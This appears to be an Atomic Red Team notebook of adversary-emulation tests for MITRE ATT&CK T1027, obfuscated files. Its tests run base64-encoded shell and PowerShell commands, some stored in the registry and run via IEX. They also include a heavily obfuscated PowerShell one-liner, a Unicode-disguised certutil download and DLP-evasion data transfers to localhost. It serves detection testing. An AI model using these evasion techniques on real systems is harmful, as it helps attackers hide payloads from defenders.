{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "404e76f0",
   "metadata": {},
   "source": "# T1027 - Obfuscated Files or Information\nAdversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also use compressed or archived scripts, such as JavaScript. \n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)\n\nAdversaries may also abuse [Command Obfuscation](https://attack.mitre.org/techniques/T1027/010) to obscure commands executed from payloads or directly via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017) "
  },
  {
   "cell_type": "markdown",
   "id": "a5047c55",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "8aa89600",
   "metadata": {},
   "source": "### Atomic Test #1 - Decode base64 Data into Script\nCreates a base64-encoded data file and decodes it into an executable shell script\n\nUpon successful execution, sh will execute art.sh, which is a base64 encoded command, that echoes `Hello from the Atomic Red Team` \nand uname -v\n\n**Supported Platforms:** macos, linux\n#### Dependencies:  Run with `sh`!\n##### Description: encode the command into base64 file\n\n##### Check Prereq Commands:\n```sh\nif [ -e \"/tmp/encoded.dat\" ]; then exit 0; else exit 1; fi\n\n```\n##### Get Prereq Commands:\n```sh\nif [ \"$(uname)\" = 'FreeBSD' ]; then cmd=\"b64encode -r -\"; else cmd=\"base64\"; fi;\necho \"echo Hello from the Atomic Red Team && uname -v\" | $cmd > /tmp/encoded.dat\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d57ef6d9",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1027 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "c8e949cd",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nif [ \"$(uname)\" = 'FreeBSD' ]; then cmd=\"b64decode -r\"; else cmd=\"base64 -d\"; fi;\ncat /tmp/encoded.dat | $cmd > /tmp/art.sh\nchmod +x /tmp/art.sh\n/tmp/art.sh\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cebbbc6a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1027 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "5bdc92a6",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm /tmp/encoded.dat \nrm /tmp/art.sh\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "44f9f779",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1027 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "cabdade3",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Execute base64-encoded PowerShell",
    "Creates base64-encoded PowerShell code and executes it. This is used by numerous adversaries and malicious tools.\n\nUpon successful execution, powershell will execute an encoded command and stdout default is \"Write-Host \"Hey, Atomic!\"\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$OriginalCommand = 'Write-Host \"Hey, Atomic!\"'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\n$EncodedCommand =[Convert]::ToBase64String($Bytes)\n$EncodedCommand\npowershell.exe -EncodedCommand $EncodedCommand\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "030cb943",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1027 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "03c58288",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Execute base64-encoded PowerShell from Windows Registry",
    "Stores base64-encoded PowerShell code in the Windows Registry and deobfuscates it for execution. This is used by numerous adversaries and malicious tools.\n\nUpon successful execution, powershell will execute encoded command and read/write from the registry.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$OriginalCommand = 'Write-Host \"Hey, Atomic!\"'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\n$EncodedCommand =[Convert]::ToBase64String($Bytes)\n$EncodedCommand\n\nSet-ItemProperty -Force -Path HKCU:Software\\Microsoft\\Windows\\CurrentVersion -Name Debug -Value $EncodedCommand\npowershell.exe -Command \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:Software\\Microsoft\\Windows\\CurrentVersion Debug).Debug)))\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6b049d8f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1027 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "f5280c15",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-ItemProperty -Force -ErrorAction Ignore -Path HKCU:Software\\Microsoft\\Windows\\CurrentVersion -Name Debug\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c342fc75",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1027 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "9717ac2e",
   "metadata": {},
   "source": "### Atomic Test #4 - Execution from Compressed File\nMimic execution of compressed executable. When successfully executed, calculator.exe will open.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: T1027.exe must exist on disk at PathToAtomicsFolder\\..\\ExternalPayloads\\temp_T1027.zip\\T1027.exe\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\temp_T1027.zip\\T1027.exe\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027/bin/T1027.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1027.zip\"\nExpand-Archive -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1027.zip\" -DestinationPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\temp_T1027.zip\\\" -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0484f990",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1027 -TestNumbers 4 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "d915d29d",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\temp_T1027.zip\\T1027.exe\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b8363f6c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1027 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "90208f68",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\ntaskkill /f /im calculator.exe >nul 2>nul\ntaskkill /f /im CalculatorApp.exe >nul 2>nul\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b0ea68f2",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1027 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "2cee45ea",
   "metadata": {},
   "source": [
    "### Atomic Test #5 - DLP Evasion via Sensitive Data in VBA Macro over email",
    "Upon successful execution, an excel containing VBA Macro containing sensitive data will be sent outside the network using email.\nSensitive data includes about around 20 odd simulated credit card numbers that passes the LUHN check.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nSend-MailMessage -From test@corp.com -To test@corp.com -Subject 'T1027_Atomic_Test' -Attachments \"PathToAtomicsFolder\\T1027\\src\\T1027-cc-macro.xlsm\" -SmtpServer 127.0.0.1\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6633051b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1027 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "b24ebf24",
   "metadata": {},
   "source": [
    "### Atomic Test #6 - DLP Evasion via Sensitive Data in VBA Macro over HTTP",
    "Upon successful execution, an excel containing VBA Macro containing sensitive data will be sent outside the network using HTTP.\nSensitive data includes about around 20 odd simulated credit card numbers that passes the LUHN check.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nInvoke-WebRequest -Uri 127.0.0.1 -Method POST -Body \"PathToAtomicsFolder\\T1027\\src\\T1027-cc-macro.xlsm\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4fe6a782",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1027 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "da5bd8df",
   "metadata": {},
   "source": [
    "### Atomic Test #7 - Obfuscated Command in PowerShell",
    "This is an obfuscated PowerShell command which when executed prints \"Hello, from PowerShell!\". Example is from the 2021 Threat Detection Report by Red Canary.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$cmDwhy =[TyPe](\"{0}{1}\" -f 'S','TrING')  ;   $pz2Sb0  =[TYpE](\"{1}{0}{2}\"-f'nv','cO','ert')  ;  &(\"{0}{2}{3}{1}{4}\" -f'In','SiO','vOKe-EXp','ReS','n') (  (&(\"{1}{2}{0}\"-f'blE','gET-','vaRIA')  ('CMdw'+'h'+'y')).\"v`ALUe\"::(\"{1}{0}\" -f'iN','jO').Invoke('',( (127, 162,151, 164,145 ,55 , 110 ,157 ,163 , 164 ,40,47, 110 , 145 ,154, 154 ,157 , 54 ,40, 146, 162 , 157,155 ,40, 120, 157 ,167,145 , 162 ,123,150 ,145 , 154 , 154 , 41,47)| .('%') { ( [CHAR] (  $Pz2sB0::\"t`OinT`16\"(( [sTring]${_}) ,8)))})) )\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "996e3472",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1027 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "b60a957b",
   "metadata": {},
   "source": [
    "### Atomic Test #8 - Obfuscated Command Line using special Unicode characters",
    "This is an obfuscated certutil command that when executed downloads a file from the web. Adapted from T1105. Obfuscation includes special options chars (unicode hyphens), character substitution (e.g. \u1da0) and character insertion (including the usage of the right-to-left 0x202E and left-to-right 0x202D override characters).\nReference:\nhttps://wietze.github.io/blog/windows-command-line-obfuscation\n",
    "**Supported Platforms:** windows",
    "Run it with these steps!",
    "1. Copy the following command into the command prompt after replacing #{remote_file} and #{local_path} with your desired URL and filename.\n\n\n  certutil \u2014\u0af9u\u0af0rl\u08b0ca\u08e2c\u0defhe  \u2013\u202espli\u0605t\u202e\u202d \u2212\"\u0d4f\u1da0\u0d78\" #{remote_file} #{local_path}\n\n\n2. Press enter to execute the command. You will find the file or webpage you specified saved to the file you specified in the command.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8132fb8a",
   "metadata": {},
   "source": [
    "### Atomic Test #9 - Snake Malware Encrypted crmlog file",
    "The following Atomic Test will create a file with a specific name and sets its attributes to Hidden, System, and Archive. This was related to the Snake Malware campaign and is later decrypted by Snake's kernel driver.\n[Snake Malware - CISA](https://media.defense.gov/2023/May/09/2003218554/-1/-1/0/JOINT_CSA_HUNTING_RU_INTEL_SNAKE_MALWARE_20230509.PDF)  \n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$file = New-Item $env:windir\\registration\\04e53197-72be-4dd8-88b1-533fe6eed577.04e53197-72be-4dd8-88b1-533fe6eed577.crmlog; $file.Attributes = 'Hidden', 'System', 'Archive'; Write-Host \"File created: $($file.FullName)\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cc79f634",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1027 -TestNumbers 9"
  },
  {
   "cell_type": "markdown",
   "id": "083817b9",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\n$fileNameToDelete = '04e53197-72be-4dd8-88b1-533fe6eed577.04e53197-72be-4dd8-88b1-533fe6eed577.crmlog'; $filePathToDelete = \"$env:windir\\registration\\\"; $fullPathToDelete = Join-Path $filePathToDelete $fileNameToDelete; if (Test-Path $fullPathToDelete) { Remove-Item -Path $fullPathToDelete -Force; Write-Host \"File deleted: $fullPathToDelete\" } else { Write-Host \"File not found: $fullPathToDelete\" }\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "33728e56",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1027 -TestNumbers 9 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "00da0607",
   "metadata": {},
   "source": "### Atomic Test #10 - Execution from Compressed JScript File\nMimic execution of compressed JavaScript file. When successfully executed, calculator.exe will open. This test is meant to help emulate Gootloader as per https://redcanary.com/blog/gootloader/\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: T1027.js must exist on disk at PathToAtomicsFolder\\..\\ExternalPayloads\\temp_T1027js.zip\\T1027js.js\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\temp_T1027js.zip\\T1027js.js\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027/bin/t1027js.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1027js.zip\"\nExpand-Archive -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1027js.zip\" -DestinationPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\temp_T1027js.zip\\\" -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4615c5ba",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1027 -TestNumbers 10 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "aac59c78",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\temp_T1027js.zip\\T1027js.js\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "63dc578b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1027 -TestNumbers 10"
  },
  {
   "cell_type": "markdown",
   "id": "87fdd59a",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\ntaskkill /f /im calculator.exe >nul 2>nul\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6ba13d4f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1027 -TestNumbers 10 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "1e85db6c",
   "metadata": {},
   "source": "## Detection\nDetection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system). \n\nFlag and analyze commands containing indicators of obfuscation and known suspicious syntax such as uninterpreted escape characters like '''^''' and '''\"'''. Windows' Sysmon and Event ID 4688 displays command-line arguments for processes. Deobfuscation tools can be used to detect these indicators in files/payloads. (Citation: GitHub Revoke-Obfuscation) (Citation: FireEye Revoke-Obfuscation July 2017) (Citation: GitHub Office-Crackros Aug 2016) \n\nObfuscation used in payloads for Initial Access can be detected at the network. Use network intrusion detection systems and email gateway filtering to identify compressed and encrypted attachments and scripts. Some email attachment detonation systems can open compressed and encrypted attachments. Payloads delivered over an encrypted connection from a website require encrypted network traffic inspection. \n\nThe first detection of a malicious tool may trigger an anti-virus or other security tool alert. Similar events may also occur at the boundary through network IDS, email scanning appliance, etc. The initial detection should be treated as an indication of a potentially more invasive intrusion. The alerting system should be thoroughly investigated beyond that initial alert for activity that was not detected. Adversaries may continue with an operation, assuming that individual events like an anti-virus detect will not be investigated or that an analyst will not be able to conclusively link that event to other activity occurring on the network. "
  },
  {
   "cell_type": "markdown",
   "id": "02c7cb84",
   "metadata": {},
   "source": "\n## Shield Active Defense\n### Decoy System \n Configure a computing system to serve as an attack target or experimental environment.   \n\n A decoy system is a computing resource presented to the adversary in support of active defense.  The underlying system can be real, virtual, or simulated, and can be presented as one of a variety of IT devices including user workstations, servers, networking systems, IOT (embedded devices), mobile systems like phones, etc.\n#### Opportunity\nIn an adversary engagement scenario, there is an opportunity to introduce decoy systems that can influence an adversary's behavior or allow you to observe how they perform a specific task.\n#### Use Case\nA defender could implement a decoy system to study how and when an adversary obfuscate files and hides information.\n#### Procedures\nUse an isolated system to visit a suspected compromised website.  Collect any associated scripting code or files dropped onto the system.\nSetup a server which appears to be something that is commonly expected within a network, such as web server.\n"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}